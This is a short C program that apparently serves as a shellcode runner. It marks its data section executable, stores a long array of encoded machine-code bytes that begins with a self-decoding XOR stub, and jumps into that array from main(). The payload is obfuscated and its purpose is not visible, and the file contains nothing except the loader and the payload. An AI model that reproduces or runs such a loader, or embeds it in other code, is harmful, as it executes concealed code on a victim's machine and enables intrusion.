#include <stdio.h>

#pragma comment(linker, "/section:.data,RWE")  
unsigned char buf[] =
"\xb9\xc1\x01\x00\x00\xe8\xff\xff\xff\xff\xc1\x5e\x30\x4c\x0e"
"\x07\xe2\xfa\xb8\xad\x02\x04\x05\xee\xf8\xf7\xf6\xf5\xca\x52"
"\x3d\x42\x01\x17\xf3\xe8\xab\x8b\x17\x12\x12\xf6\xe1\xed\xed"
"\xe9\xd7\x4c\x22\x62\x20\x35\xd0\xcc\xee\xf0\xe8\x4e\x1f\xc0"
"\x8b\x98\xdb\x22\xdc\x78\x10\xd5\xac\x67\x36\x72\x1b\x89\xc9"
"\x00\x06\x7c\x19\xea\x5a\x2c\x09\x09\xc6\x8c\xf6\xfd\x43\xca"
"\x2a\x8e\xa9\x2c\xec\xcb\xfe\x45\xc0\xec\x5b\x7e\x2d\xfa\x99"
"\xfc\xeb\x48\x95\x2a\x41\x40\xdf\xf8\x18\xbe\x49\x6c\x29\xeb"
"\xd2\x91\xc6\x94\x2e\x74\x5a\x05\x4f\xe5\x1d\xb4\x47\x31\xca"
"\xe9\xdc\x3a\x42\x69\xa0\xa5\x2d\x4f\x74\x99\x87\xe4\x08\xb5"
"\x52\xe6\x0c\x97\x50\xd9\x7b\x71\xd7\x40\x46\x71\x48\xa9\xa0"
"\x4c\xe2\x92\x51\xf9\x5f\x98\x52\x97\x82\x63\xa2\x4d\xec\xee"
"\xe2\x04\xd9\x36\x19\x94\xdd\x9d\xbf\x30\x5f\x50\x22\x91\x7a"
"\x24\x0b\xd0\x8a\xbd\x41\x39\x96\xb8\x8d\x88\xa7\x8b\xa5\x4c"
"\x7e\xc6\x64\x54\xb1\xf1\x5b\xe4\xa6\x7c\x82\xd1\x47\x8d\x5e"
"\xeb\x71\x73\x8a\x87\xd3\x52\x6a\x69\x49\xe7\xdb\xa5\x92\x4e"
"\xb9\x0c\x8f\x6b\x56\x83\x5c\xa1\x7c\xd6\xaf\x3b\x78\x40\x68"
"\x85\x95\x17\xd2\x33\x51\xd8\xeb\xb7\x41\xe0\xd3\xa7\xd5\x59"
"\x6b\x67\x3d\xcf\x1d\xd8\x89\xd5\x0d\xd3\x8b\x4a\x16\x33\x03"
"\xd2\x33\xe7\x8a\x92\x68\x81\xc3\x26\xd1\x65\x52\x25\x20\x7b"
"\xb2\x6f\x8b\x43\xc4\x4c\xe7\x80\x90\x16\xe3\xa7\xda\x71\x82"
"\x8a\xc7\x5f\xaf\xa0\x47\x1a\x6c\x8f\x90\xdc\x79\x52\x84\x30"
"\x41\xd3\x45\x82\x80\x86\x7f\xcb\x52\x29\x64\x51\x03\x5d\xcb"
"\xdb\x13\x80\x9c\x1a\x46\xd1\xd5\x58\x30\x79\xd6\x69\x32\x4e"
"\x7f\x8a\xab\x13\x14\x97\x5d\x96\xef\x7c\x3a\x0e\x03\xd4\x44"
"\x84\xca\x8c\x2a\x44\xd8\x3d\x17\x24\xab\xc6\x6d\x69\x0f\x72"
"\xcb\x31\x62\x19\xa9\x4a\xd1\xf9\x5c\xe0\x4e\xd6\x23\xd9\x86"
"\xd8\x60\xcf\x55\x9c\x6b\x1c\x92\xca\x37\x11\x51\x04\x44\xe2"
"\xfa\x05\xe4\x95\xa5\x4e\xf2\x70\xd5\x20\x7c\xec\x99\x05\x7f"
"\xf2\xad\x87\x36\xba\x74\x4c\xe8\x30\x3c\x36\x7a\xe7\x18\xbb"
"\x40\x88\x93\xe3\x19\x86\xda\x9a\x4b\xab\xb2\xbb\x8e\xbf\x63"
"\x52\xbc\x8d";

int main(void)
{
	((void(*)())&buf)();
}